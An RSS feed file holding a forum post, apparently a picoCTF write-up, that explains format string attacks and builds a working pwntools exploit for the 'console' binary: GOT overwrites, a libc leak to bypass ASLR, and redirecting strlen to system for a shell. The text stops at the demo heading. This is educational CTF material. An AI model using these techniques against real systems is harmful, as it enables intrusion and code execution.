@@ -1,0 +1,1557 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>picoCTF Write-up ~ Bypassing ASLR via Format String Bug</title>
+    <link>https://d.clarkee.co.uk/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920</link>
+    <description>Hello folks! I hope you&#39;re all doing great. After a disgusting amount of trial and error, I present to you my solution for the _console_ pwnable. Unfortunately, I did not solve the task on time but it was fun nevertheless. I decided to use this challenge as a way to introduce to you one of the ways you can bypass ASLR. 
+
+If you have never messed with basic pwning i.e stack/buffer overflows, this write-up might not be your cup of tea. It&#39;ll be quite technical. Firstly I&#39;ll bombard you with theory and then we will move to the actual PoC/exploit, aka the all-time classic @_py way of explaining stuff.  
+
+Let&#39;s dive right into, shall we?
+
+---
+###Code Auditing
+
+Though the source code was provided (you can find a link to at the bottom of the write-up), you could easily spot the bug just by reading the disassembly. Since some of you might not be experienced with Reverse Engineering, below are the important parts of code:
+
+```python
+[...]
+
+void set_exit_message(char *message) {
+    if (!message) {
+        printf(&quot;No message chosen\n&quot;);
+        exit(1);
+    }
+    printf(&quot;Exit message set!\n&quot;);
+    printf(message);  
+
+    append_command(&#39;e&#39;, message);
+    exit(0);
+}
+
+void set_prompt(char *prompt) {
+    if (!prompt) {
+        printf(&quot;No prompt chosen\n&quot;);
+        exit(1);
+    }
+    if (strlen(prompt) &gt; 10) {
+        printf(&quot;Prompt too long\n&quot;);
+        exit(1);
+    }
+    printf(&quot;Login prompt set to: %10s\n&quot;, prompt);
+
+    append_command(&#39;p&#39;, prompt);
+    exit(0);
+}
+
+[...]
+
+void loop() {
+    char buf[1024];
+    while (true) {
+        printf(&quot;Config action: &quot;);
+        char *result = fgets(buf, 1024, stdin);
+        if (!result) exit(1);
+        char *type = strtok(result, &quot; &quot;);
+        if (type == NULL) {
+            continue;
+        }
+        char *arg = strtok(NULL, &quot;\n&quot;);
+        switch (type[0]) {
+        case &#39;l&#39;:
+            set_login_message(arg);
+            break;
+        case &#39;e&#39;:
+            set_exit_message(arg);
+            break;
+        case &#39;p&#39;:
+            set_prompt(arg);
+            break;
+        default:
+            printf(&quot;Command unrecognized.\n&quot;);
+            /* Fallthrough */
+        case &#39;h&#39;:
+            print_help();
+            break;
+        }
+    }
+}
+
+[...]
+
+```
+
+Here is the bug:
+
+```python
+void set_exit_message(char *message) {
+             [...]
+    printf(&quot;Exit message set!\n&quot;);
+    printf(message);
+
+    append_command(&#39;e&#39;, message);
+    exit(0);
+}
+```
+Cute, we&#39;ve got control over **printf**! For those who do not understand why this is a bug, let me give you a brief rundown. To be honest, there are a bunch of resources on how format string attacks work, but since I&#39;m making the effort to explain the exploit, it&#39;d feel incomplete not to explain the theory behind it. I hope you know the basics of the stack at least, otherwise the following will not make much sense.
+
+---
+
+
+###Printf &amp; Stack Analysis
+
+```makefile
+                        +------------+
+                        |            |
+                        |     ...    |
+                        |   8th arg  |
+                        +------------+
+                        |   7th arg  |
+                        +------------+
+                        |   ret addr |
+                        +------------+
+                        |     ...    |
+                        | local vars |
+                        |     ...    |
+                        +------------+
+```
+
+Now you might be asking yourselves, &quot;what&#39;s up with the 7th and 8th argument in the ascii art?&quot;. Well, we are dealing with a 64-bit ELF binary. Meaning, as far as the function calling convention is concerned, the ABI states the following(simplified):
+
+---
+_The first 6 integer or pointer arguments to a function are passed in registers. The first is placed in rdi, the second in rsi, the third in rdx, and then rcx, r8 and r9. Only the 7th argument and onwards are passed on the stack._
+---
+
+Interesting. Let&#39;s enter the h4x0r mode and brainstorm a little bit. By typing **_man 3 printf_** we get the following intel:
+
+```makefile
+#include &lt;stdio.h&gt;
+
+       int printf(const char *format, ...);
+```
+
+So printf receives &quot;2&quot; arguments:
+
+* The string format i.e &quot;%d %x %s&quot;.
+* A variable number of arguments.
+
+Ok that sounds cool and all, but how can we exploit this? The key in exploit development and in hacking overall, is being able to **see through the abstraction**. Let me explain myself further.
+
+Let&#39;s assume we have the following code:
+
+```c
+[...]
+1. int32_t num = 6;
+2. printf(&quot;%d&quot;, num);
+[...]
+```
+Here&#39;s the pseudo-assembly for it:
+
+```asm
+1. mov [rbp - offset], 0x6
+2. mov rsi, [rbp - offset]
+3. mov rdi, &quot;%d&quot;
+4. call printf
+```
+Our format specifier includes &quot;%d&quot;. What this whispers into printf&#39;s ear is &quot;yo printf, you are about to get called with one format specifier, %d to be precise. According to the ABI, expect the argument to be in rdi, ok?&quot; Then, printf will read the content of rdi and print the number 6 to stdout. Do you see where this is going? No? Alright, one more example.
+
+```c
+[...]
+1. int32_t num = 6;
+2. printf(&quot;%d %d %d %d&quot;);
+[...]
+```
+```asm
+1. mov [rbp - offset], 0x6
+2.    ???
+3. call printf
+```
+In case you didn&#39;t notice, I changed the format string and the number of arguments being passed to printf. &quot;What will this whisper into printf&#39;s ear?&quot; you ask. Well, &quot;yo printf, you are about to get called with 4 format specifiers, 4 %d&#39;s to be precise. According to the ABI, expect the arguments to be in rdi, rsi and so on, ok?&quot; Now what&#39;s going to happen in this case? Has anything practically changed?
+
+Ofcourse not! Printf is dumb, all it knows is the format specifier. It &quot;trusts&quot; us, the user/program about the content of rdi, rsi etc. As I&#39;ve stated before, we had control over printf. Control over its format specifier argument to be exact. That&#39;s really powerful! Why? 
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/0/0a38ae0a255f4f0810ad7789101ea34d00257188.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/4ydrob1b7b6nmzupx883axyxr)
+
+The above clip is a demo of the vulnerable CTF task. If you read the source code real quick (shouldn&#39;t take more than 5 mins to understand what it does), you&#39;d realize that **set_exit_message** essentially receives as an argument whatever we place next to &#39;e&#39; (e stands for exit). Afterwards, it calls printf with that argument. So what gives? 
+
+The format string we provided, instructed printf to print its 8 byte integer &quot;arguments&quot; as pointers (%p expects a pointer). The values printed are values that printf finds at the locations it would normally expect arguments. Because printf actually gets one real argument, namely the pointer to buf (passed in %rdi), it will expect the next 5 arguments within the remaining registers and everything else on the stack. That&#39;s the case with our binary as well! We managed to leak memory!  
+
+And the best part? We actually read values &quot;above&quot; **set_exit_message&#39;s** stack frame! Take a good look at the printf output. Does **0x400aa6** ring a bell? Looks like a text segment address. That&#39;s the return address in **set_exit_message&#39;s** stack frame, aka a loop&#39;s instruction address!
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/d50700cf5d356d850c109897c98aa172705002b7.png&quot; width=&quot;315&quot; height=&quot;38&quot;&gt;
+
+Moreover, did you notice the **0x7025207025207025** value? Since the architecture is little-endian, converting the hex values to characters, we get the following:
+
+```makefile
+0x25 -&gt; &#39;%&#39;
+0x70 -&gt; &#39;p&#39;
+0x20 -&gt; &#39; &#39;
+```
+Holy moly! We leaked **main&#39;s** stack frame! But more importantly, our own input! That&#39;s the so called **read primitive**, which basically means we get to read whatever value we want, either in registers, stack or even our own input. You&#39;ll see how crucial that is in the exploitation segment.
+
+Do you understand now what I mean by seeing through the abstraction? We managed to exploit a simple assumption that computer scientists took for granted.
+
+---
+
+Phew, alrigthy, I hope I made sense folks. Let&#39;s slowly move on to the exploitation part. First of all, this is a pwnable task, which means we need to get a shell (root privs) in order to be able to  read the _flag_ text file. Hmm, how can we tackle the task knowing that we have a read primitive? Let&#39;s construct a plan:
+
+* We managed to read values off of registers and the stack, aka read primitive.
+
+* We can take advantage of that and read certain values that will be useful to us, such as libc&#39;s base address. If we manage to leak libc&#39;s address, we can calculate addresses of other &quot;pwnable&quot; functions such as **execve** or **system**, and get a shell. Note, I say &quot;leak&quot;, because ASLR is activated. Thus, in every execution the libc will have a different base address. Otherwise, if ASLR was off, its address would be hardcoded and our life would be much easier. Libc&#39;s functions are a constant offset away from libc&#39;s base address so we won&#39;t have an issue leaking them once we get the base address.
+
+* Alright, we can leak libc&#39;s functions, and then what? Let&#39;s pause our plan for a while. 
+
+_(_**_Note:_** _Though dynamic linking is not a prerequisite to understand the high level view of the exploit, knowing its internals will give you a much better insight of the nitty-gritty details of the exploitation process. I have made quite a detailed write-up on Dynamic Linking internals which can be found [here](https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488))._
+
+---
+
+###The Dark Side Of Printf
+
+We saw that we have an arbitrary read through the format string bug. But that&#39;s not enough. Wouldn&#39;t be awesome if we could somehow not only **read** values but also **write**? 
+
+Enter the dark zone folks:
+
+---
+* _%n specifier_
+
+If you are not into pwning or programming in C you have probably never seen the &quot;%n&quot; specifier. %n is the gold mine for format string attacks. Using this stackoverflow [link](http://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c) as a reference, I&#39;ll explain what %n is capable of.
+
+```python
+#include &lt;stdio.h&gt;
+
+int main()
+{
+  int val;
+
+  printf(&quot;blah %n blah\n&quot;, &amp;val);
+
+  printf(&quot;val = %d\n&quot;, val);
+
+  return 0;
+
+}
+```
+Output:
+
+```makefile
+blah  blah
+val = 5
+```
+Simply put, it stores the amount of characters printed on the screen to a variable (providing its address).
+
+Sweet, now we have a **write primitive** as well! How can we take advantage of that? Since we have an arbitrary write, we can write anything we want to wherever we want (you&#39;ll see how shortly). Let&#39;s resume our plan:
+
+* We can overwrite any address with a value that makes our life easier.
+
+* We could overwrite a function&#39;s address with system&#39;s and game over! 
+
+* Nope, not that easily at least. Looking at the source, we can see that after printf is called, exit() is called. This is a bummer, since our plan does not only require an arbitrary write, but an arbitrary read as well. We can&#39;t just leak libc&#39;s base address AND overwrite a function through the same format string. We need to do it in separate steps. But how? Exit() will terminate the program.
+
+* Unless, we overwrite exit&#39;s address with something else! Hmm, that&#39;s indeed a pretty neat idea. But with what?
+
+* What about loop&#39;s address?! That sounds like an awesome plan! We can overwrite exit&#39;s address with loop&#39;s, leading to the binary never exiting! That way, we can endlessly enter our bogus input and read/write values with no rush. 
+
+---
+* %[width] modifier
+
+Another dark wizardry of printf is the following code:
+
+```python
+[...]
+printf(&quot;Output:&quot;);
+printf(&quot;%100x&quot;, 6);
+[...]
+```
+Terminal:
+
+```makefile
+&gt; ./demo
+Output:                                         6
+```
+
+6 is padded to a size of 100 bytes long. In other words, with the [modifier] part we can instruct printf to print whatever amount of bytes we want. Why is that useful though? Imagine having to write the value 0x1337 to a variable using the %n specifier (keep in mind that function addresses vary from 0x400000 all the way to 0x7fe5b94126a3. That trick will be really helpful to us.). Trying to actually type 0x1337 character by hands is tedious and a waste of time. The above modifier gets the job done easier.
+
+---
+
+* %[number]$ specifier
+
+The last trick we&#39;ll be using is the $[number] specifier which helps us refer to certain stack offsets and what not. Demo time:
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/7/7716a3e9263ab8559756b0c4af3bfeca358c670a.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/ef1fcjmmmvvwuhbgoe2jmgha4)
+
+Scroll up to the demo where I showed you the bug in action through the %p specifier. If you count the values that are printed, you will notice that **0x400aa6** is the 9th value. By entering %9$p as I showed above, we can refer to it directly. Imagine replacing &#39;p&#39;, with &#39;n&#39;. What would have happened? In a different case, it would crash because 0x400aa6 would be overwritten with the amount of characters being printed (which would not be a valid instruction address). In our case, nothing should happen since exit() is called, which means we will never return back to loop().
+
+---
+
+###Pwning Time
+
+I know this might look like a lot to take in, but without the basics and theory, we are handicapped. Bare in mind, it took me around 3-5 days of straight research in order to get this to work. If you feel like it&#39;s complicated, it&#39;s not. You just need to re-read it a couple of times and play with the binary yourself in order to get a feel of it. Be patient, code is coming soon. It will all make sense (hopefully).
+
+Our plan starts making sense. First step is to overwrite exit&#39;s address with loop&#39;s. Luckily for us, the binary does not have full ASLR on. Meaning, the text segment which includes the machine code, and the Global Offset Table (refer to my Dynamic Linking write-up, I warned you), which includes function pointers to libc (and more), will have a hardcoded address.
+
+Now that we learnt all about the dark side of printf, it&#39;s time to apply this knowledge onto the task.
+
+---
+
+###Overwriting exit
+
+In order to do that, we first need to place exit&#39;s GOT entry in the format string. The reason for that is that since we have an arbitrary read/write:
+
+1. We can place exit&#39;s address in the format string (which will be stored on the stack). 
+
+2. Use with the %$[number] specifier to refer to its offset.
+
+3. Use the %[number] modifier to pad whatever is already printed to a certain number.
+
+3. Use the %n specifier to write that certain number to exit&#39;s address.  
+
+Let&#39;s begin exploring with the terminal and soon we will move to python using [pwntools](https://github.com/Gallopsled/pwntools). By the way, not sure if you noticed it, but I decided to include more &quot;live&quot; footage this time than just screenshots. The concept can be confusing so I&#39;ll do my best to be as thorough as possible.
+
+Let the pwning begin:
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/a/a6b0697428a7f087e20a4713e1e2a82208a0c115.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/1nm7h6p8rpj9g889zd9g1bsg9)
+
+At this point I&#39;d like to thank @exploit who reminded me of the stack alignment because I was stuck trying to figure out why the A&#39;s were getting mixed up. Watch each demo carefully. If I feel there is a need to explain myself further I&#39;ll add comments below the asciinema instance. You are more than welcome to ask me questions in the comments.
+
+Anyway, as shown in the demo, we begin our testing by entering A&#39;s in our format string and then %p&#39;s in order to print them out. We found out that they are the 15th value. Let&#39;s try the %15$p trick this time.
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/6/6f513a4de96a736f845cfebc6a923b38664abc9b.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/f2q1xs0yxwul35n1m2sostiq7)
+
+Looking good so far. Let&#39;s automate it in python so we won&#39;t have to enter it every time.
+
+```python
+# demo.py
+
+from pwn import *
+
+p = process([&#39;./console&#39;, &#39;log&#39;])
+pause()
+
+payload  = &quot;exit&quot;.ljust(8)
+payload += &quot;A&quot;*8
+payload += &quot;|%15$p|&quot;.rjust(8)
+
+p.sendline(payload)
+p.recvline()
+
+p.interactive()
+```
+Awesome, now we&#39;ve got control over our input and we know its exact position. Let&#39;s try with exit&#39;s GOT entry this time, **0x601258**. Remember, we are dealing with 8-byte chunks so we need to pad the address to 8-bytes long:
+
+```python
+# demo.py
+
+from pwn import *
+
+p = process([&#39;./console&#39;, &#39;log&#39;])
+pause()
+
+payload  = &quot;exit&quot;.ljust(8)
+payload += p64(0x601258) # \x58\x12\x60\x00\x00\x00\x00\x00
+payload += &quot;|%15$p|&quot;.rjust(8)
+
+p.sendline(payload)
+p.recvline()
+
+p.interactive()
+```
+Let&#39;s see what it does in action.
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/e/eeb8ef0ed2506ec41eac47ac62464f6b33d2f2fd.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/dzsospkt6eqt2fjsdfyxtfo48)
+
+Hm, something is wrong here. Not only did we not get the address, but not even the &quot;|...|&quot; part. Why? Well, in case you didn&#39;t know, **printf will stop at a null-byte**. Which makes sense! Exit&#39;s GOT entry does have a null-byte. Meaning, printf will read up to &#39;\x60&#39; and then it will stop. How can we fix that? Easy, we just move our address **after** the format specifier.
+
+```python
+#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+
+p = process([&#39;./console&#39;, &#39;log&#39;])
+pause()
+
+payload  = &quot;exit&quot;.ljust(8)
+payload += &quot;|%16$p|&quot;.rjust(8)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+
+```
+Now our script should work. I&#39;ve changed exit&#39;s position in the string and updated &#39;%15$p&#39; to &#39;%16$p&#39;. I&#39;ll let you think about why I changed the specifier offset. After all this explanation it should be clear. Let&#39;s run our script, shall we?
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/6/6faa3c3d3b11d65e83914c0990ea4be038ce0b9c.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/92uk4lctooo3wv028b9vov97t)
+
+Look at that, our address is there! Problem fixed. Unfortunately that&#39;s the bummer with 64-bit addresses but when it comes to 32-bit ones, we wouldn&#39;t have that issue. Either way, the fix was simple. Let&#39;s recap:
+
+* We&#39;ve managed to get control over our input.
+
+* We placed exit&#39;s address in the string.
+
+* In doing so, we managed to find its offset.
+
+* Knowing its offset we can use %offset$n to write to that address.
+
+Thinking back to our plan, our goal is to overwrite exit&#39;s address with loop()&#39;s. I know beforehand that exit&#39;s GOT entry points to **0x400736**. That&#39;s because exit has not been called yet and thus it points to its PLT entry which has executable code to find exit&#39;s address in libc. So what we want is this:
+
+```makefile
+0x400736 =&gt; 0x4009bd
+```
+We don&#39;t have to overwrite the whole address as you can see. Only its 2 lower bytes. Now I will demonstrate how %n can be used. You will notice that demo will be kinda slow. That&#39;s because asciinema does not record 2 terminals at a time and I&#39;ll be using two. One to run the binary and one to use gdb and attach to it. Updated script:
+
+```python
+#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+
+p = process([&#39;./console&#39;, &#39;log&#39;])
+pause()
+
+payload  = &quot;exit&quot;.ljust(8)
+payload += &quot;|%17$n|&quot;.rjust(16)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+```
+First I will show what&#39;s happening without the help of GDB and then I&#39;ll fire it up.
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/b/be609965de4b68a04584f5402ad089b14343d884.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/avz10dus19qnhtfhpn5avni1w)
+
+We get a segfault, which makes sense, right? We overwrote exit&#39;s address with the amount of characters being printed, which is too little and thus not a legal address to jump to. Let&#39;s see what GDB has to say about this.
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/c/c395b3de3b24ae223a05014650acdd08316a64e8.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/dh4d2ougg1c3pss78wxh4cwcl)
+
+As shown above, I attached to the running binary with GDB and pressed enter in my 2nd terminal to send the input. It&#39;s pretty clear that exit&#39;s address got overwritten.
+
+```makefile
+0x400736 =&gt; 0x0000000d
+```
+This is definitely not what we want as the result, but we are getting there! We can use our printf magic tricks and make it work.
+
+* %[number]
+
+In order to increase the number of bytes being printed.
+
+* %hn specifier
+
+I didn&#39;t mention it earlier, but it&#39;s time to introduce you to yet another dark side of printf. With %hn we can overwrite the address **partially**. %hn has the ability to overwrite only the 2 bytes of our variable, exit&#39;s address in our case. I said it earlier that we don&#39;t need to overwrite the whole address, only its lower 2 bytes since the higher 2 bytes are the same. I know, I know, confusing, but hey, that&#39;s why a demo is on its way!
+
+Updated script:
+
+```python
+#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+
+p = process([&#39;./console&#39;, &#39;log&#39;])
+pause()
+
+payload  = &quot;exit&quot;.ljust(8)
+payload += &quot;|%17$hn|&quot;.rjust(16)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+```
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/0/09a83732323f38b55114e0658ec7dbb631f82b68.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/axjcv07pcy2b5ml8nth3dqr05)
+
+Bam! We went from **0x0000000d** to **0x0040000c**. Partial overwrite folks! Now let&#39;s think carefully. We want **0x09bd** to be the 2 lower bytes. All we have to do is:
+
+* Convert 0x09bd to decimal.
+* Use that number in the form of %2493x. You will notice that the 2 lower bytes will be slightly off but we can adjust that as you&#39;ll see soon. Let&#39;s update our script:
+
+```python
+#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+LOOP     = 0x4009bd
+
+p = process([&#39;./console&#39;, &#39;log&#39;])
+pause()
+
+payload  = &quot;exit&quot;.ljust(8)
+payload += (&quot;%%%du|%%17$hn|&quot; % 2493).rjust(16)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+
+```
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/1/1e497babc090acd11e2ef4f89d6801be1a159aef.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/3o9igq8m5nvuv5hnwrm32etef)
+
+Looks like it worked! Well, almost. We just need to subtract 6 and we should be golden! Updated script:
+
+```python
+#demo.py
+
+from pwn import *
+
+EXIT_GOT = 0x601258
+LOOP     = 0x4009bd
+
+p = process([&#39;./console&#39;, &#39;log&#39;])
+pause()
+
+payload  = &quot;exit&quot;.ljust(8)
+payload += (&quot;%%%du|%%17$hn|&quot; % 2487).rjust(16)
+payload += p64(EXIT_GOT)
+
+p.sendline(payload)
+
+p.interactive()
+
+```
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/2/26e4d78a850e4bbbda0656e8286c5133e9575da9.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/9di551o5g5vnboa9czhgiom8u)
+
+Boom! We successfully overwrote exit&#39;s address with loop&#39;s. So every time exit gets called, we will jump right back in the beginning and we will be able to enter a different format string, but this time to leak libc&#39;s base address and more.
+
+---
+
+###Leaking Libc
+
+Time to move on with our plan. Leaking libc is not that hard. With a little bit of code we can resolve its base address in no time.
+
+```python
+def leak(addr):
+    info(&quot;Leaking libc base address&quot;)
+
+    payload  = &quot;exit&quot;.ljust(8)
+    payload += &quot;|%17$s|&quot;.rjust(8)
+    payload += &quot;blablala&quot;
+    payload += p64(addr)
+
+    p.sendline(payload)
+    p.recvline()
+
+    data   = p.recvuntil(&quot;blablala&quot;)
+    fgets  = data.split(&#39;|&#39;)[1]
+    fgets  = hex(u64(fgets.ljust(8, &quot;\x00&quot;)))
+
+    return fgets
+```
+I will not explain every technical aspect of the snippet since this is not a Python tutorial. This is what I tried to achieve overall:
+
+* The goal is to leak libc&#39;s base address.
+
+* We can accomplish that by leaking a libc&#39;s function address. Fgets() in our case would be a wise choice since it&#39;s already been resolved. In particular, I entered fgets&#39;s GOT entry which contains the actual address.
+
+* The %s specifier will treat the address we entered as a string of bytes. Meaning, it will try to read what&#39;s **IN** the GOT entry.
+
+* The output will be a stream of raw bytes.
+
+* I used the u64() function to convert the raw bytes to an actual address.
+
+* Once we find its address, we subtract its libc offset from it and we get the base address.
+
+I made the exploit a little cleaner:
+
+```python
+#demo.py
+
+from pwn import *
+import sys
+
+HOST = &#39;shell2017.picoctf.com&#39;
+PORT = &#39;47232&#39;
+
+
+LOOP          = 0x4009bd
+STRLEN_GOT    = 0x601210
+EXIT_GOT      = 0x601258
+FGETS_GOT     = 0x601230
+FGETS_OFFSET  = 0x6dad0
+SYSTEM_OFFSET = 0x45390
+STRLEN_OFFSET = 0x8ab70
+
+def info(msg):
+    log.info(msg)
+
+def leak(addr):
+    info(&quot;Leaking libc base address&quot;)
+
+    payload  = &quot;exit&quot;.ljust(8)
+    payload += &quot;|%17$s|&quot;.rjust(8)
+    payload += &quot;blablala&quot;
+    payload += p64(addr)
+
+    p.sendline(payload)
+    p.recvline()
+
+    data   = p.recvuntil(&quot;blablala&quot;)
+    fgets  = data.split(&#39;|&#39;)[1]
+    fgets  = hex(u64(fgets.ljust(8, &quot;\x00&quot;)))
+
+    return fgets
+
+def overwrite(addr, pad):
+    payload  = &quot;exit&quot;.ljust(8)
+    payload += (&quot;%%%du|%%17$hn|&quot; % pad).rjust(16)
+    payload += p64(addr)
+
+    p.sendline(payload)
+    p.recvline()
+
+    return
+
+def exploit(p):
+    info(&quot;Overwriting exit with loop&quot;)
+
+    pad = (LOOP &amp; 0xffff) - 6
+    overwrite(EXIT_GOT, pad)
+
+    FGETS_LIBC  = leak(FGETS_GOT)
+    LIBC_BASE   = hex(int(FGETS_LIBC, 16) - FGETS_OFFSET)
+    SYSTEM_LIBC = hex(int(LIBC_BASE, 16) + SYSTEM_OFFSET)
+    STRLEN_LIBC = hex(int(LIBC_BASE, 16) + STRLEN_OFFSET)
+
+    info(&quot;system:   %s&quot; % SYSTEM_LIBC)
+    info(&quot;strlen:   %s&quot; % STRLEN_LIBC)
+    info(&quot;libc:     %s&quot; % LIBC_BASE)
+
+    p.interactive()
+
+if __name__ == &quot;__main__&quot;:
+    log.info(&quot;For remote: %s HOST PORT&quot; % sys.argv[0])
+    if len(sys.argv) &gt; 1:
+        p = remote(sys.argv[1], int(sys.argv[2]))
+        exploit(p)
+    else:
+        p = process([&#39;./console&#39;, &#39;log&#39;])
+        pause()
+        exploit(p)
+```
+Just some notes on how to find the libc the binary uses and how to find the function offsets:
+
+```makefile
+&gt; ldd console
+  [...]
+  libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6
+  [...]
+```
+
+```makefile
+&gt; readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep fgets
+  [...]
+  753: 000000000006dad0   417 FUNC    WEAK   DEFAULT   13 fgets@@GLIBC_2.2.5
+  [...]
+```
+Let&#39;s watch the magic happen:
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/1/1589a983920f1057ad5971f46f460fcf956e1f02.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/3vwznvpj2ms6x7322re2tbtgr)
+
+As you can see, in every execution the libc&#39;s base changes, aka ASLR. But that does not affect us anymore since we overwrote exit with loop().
+
+---
+
+###Jumping to system
+
+2/3 of our plan is successfully done. All that is left is redirecting code execution to system with the argument being _/bin/sh_ or _sh_ ofcourse. 
+
+In case you didn&#39;t notice, I purposely picked **strlen** as the victim. Why is that? Both **system** and **strlen** are invoked with one argument. Thus, once we overwrite **strlen** with **system**, **system** will read what is supposedly strlen&#39;s argument and execute that command. 
+
+Looks like we have to go back to step #1 of our exploit. Meaning, we have to overwrite strlen&#39;s libc address with system&#39;s. Luckily for us, they share the same base address so practically we only have to overwrite the lower 4 bytes. For example, let&#39;s use one of our script&#39;s output.
+
+```makefile
+             +-----------------------------+
+             |                             |
+0x7fb4|21ec|0b70| (strlen) =&gt; 0x7fb4|21e7|b390| (system)
+         |                            |
+         +----------------------------+
+           
+```
+
+This is how we can accomplish that:
+
+```python
+    # subtract -7 at the end to get the correct offset
+    WRITELO =  int(hex(int(SYSTEM_LIBC, 16) &amp; 0xffff), 16) - 7
+    WRITEHI = int(hex((int(SYSTEM_LIBC, 16) &amp; 0xffff0000) &gt;&gt; 16), 16) - 7
+
+    # call prompt in order to resolve strlen&#39;s libc address.
+    p.sendline(&quot;prompt asdf&quot;)
+    p.recvline()
+
+    info(&quot;Overwriting strlen with system&quot;)
+    overwrite(STRLEN_GOT, WRITELO)
+    overwrite(STRLEN_GOT+2, WRITEHI)
+```
+The only part that deserves a bit of explanation is this one:
+
+```python
+    overwrite(STRLEN_GOT, WRITELO)
+    overwrite(STRLEN_GOT+2, WRITEHI)
+```
+It seems like we overwrite the libc address via **two short writes**. It could be possible to do it with one but that would print a pretty big amount of padding bytes on the screen so with two writes is a bit cleaner. The concept is still the same. Let&#39;s visualize it as well:
+
+```makefile
+strlen GOT = 0x601210
+
+                    Global Offset Table
+                   +--------------------+
+                   |        ...         |
+                   +--------------------+
+                   |        ...         |    ...
+                   +--------------------+
+                   |        0x21        |   0x601213
+               /   +--------------------+
+ strlen + 0x2 |    |        0xec        |   0x601212
+               \   +--------------------+
+                   |        0x0b        |   0x601211
+                /  +--------------------+
+ strlen + 0x0  |   |        0x70        |   0x601210
+                \  +--------------------+
+```
+Now it should be more clear why and how we overwrite 2 bytes with each write. I&#39;ll show you each write separately with GDB and then the full exploit. Because I&#39;ll try to provide a view of both the exploit and GDB, the demos might be a bit slow because I&#39;ll be jumping around the terminals. Stay with me.
+
+```makefile
+overwrite(STRLEN_GOT, WRITELO)
+```
+
+Exploit (skip a few seconds):
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/8/844cc0a7634e06e2a7a613ada30fffa27152c54c.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/2sdayp9kec3e4nrat55hvlmsd)
+
+GDB:
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/e/ebc5095097c82309cd8ee3b4addaf8bfd101b0aa.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/88ik6kzzimu0t4qwxaf02qo5n)
+
+You might noticed that at some point in the exploit I typed &quot;prompt asdf&quot;. The reason I did that was to resolve strlen&#39;s address since it&#39;s the first time being called. I set a breakpoint in GDB at that point and stepped through the process. First time it went through the PLT stub code in order to resolve itself and once I typed _c_, its address was resolved and we overwrote its 2 lower bytes.
+
+```makefile
+Before:
+system: 0x7fea06160390
+strlen: 0x7fea061a5b70
+
+After:
+strlen: 0x7fea06160397
+```
+The 2 lower bytes are 7 bytes off which is why in the exploit you saw the -7 subtraction. Sometimes it ended up being 5 or 6 bytes off, but it doesn&#39;t matter. Just adjust the value to your needs. In your system it should be the same offset more or less.
+
+Let&#39;s execute the exploit with both writes this times.
+
+Exploit (skip a few seconds):
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/2/2a3c1f89047bc09d8a3a3666ed7f22776481a1ec.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/9ovrrps3bup4p2r6lanqvfis6)
+
+GDB:
+
+[&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/e/ea67e2ac28f1cefaeb009c75e85ac79f25a47b7d.png&#39; alt=&#39;asciicast&#39;&gt;](https://asciinema.org/a/4sbeeahpxqjjcij8xv5hv3k7b)
+
+```makefile
+Before:
+system:   0x7fe7a273a390                                                                          
+strlen:   0x7fe7a277fb70
+
+After:
+strlen:   0x7fe7a273a390
+```
+Voila! We successfully overwrote strlen with system! Let&#39;s fire up the exploit without GDB and get shivers.
+
+---
+
+###PoC Demo
+
